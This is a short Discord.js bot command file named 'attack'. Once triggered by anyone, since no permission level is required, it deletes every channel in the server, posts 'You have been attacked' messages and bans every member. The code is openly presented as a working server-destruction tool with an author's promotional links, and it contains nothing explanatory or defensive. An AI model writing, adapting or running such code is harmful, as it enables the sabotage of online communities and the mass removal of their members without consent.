//This code belong to Terbyt. github.com/Terbyt | www.terbyt.rf.gd
const Discord = require('discord.js');

exports.run = function(client, message, doSomething) {
//ok
  message.guild.channels.map(m => m.delete())
  message.guild.createChannel('you-have-been-attacked', 'text').then(zzz => {
    zzz.send('**You have been attacked.**')
        zzz.send('**You have been attacked from a Anonymous User**')
            zzz.send(':crossed_swords: **This bot developed by Terbyt (not attacked) github.com/Terbyt/ | www.terbyt.rf.gd** :crossed_swords:')


   

  })
   
  message.guild.createChannel('Crying Room', 'voice')
  message.guild.members.forEach(i => {
  i.ban();
  })
};
   
exports.conf = {
  enable: true, 
  guildOnly: false, 
  aliases: [], 
  permLevel: 0 
}

exports.help = {
  name: 'attack', 
  description: 'If bot has permission. Bot will start attack.', 
  usage: 'attack' 
};
//This code belong to Terbyt. github.com/Terbyt | www.terbyt.rf.gd
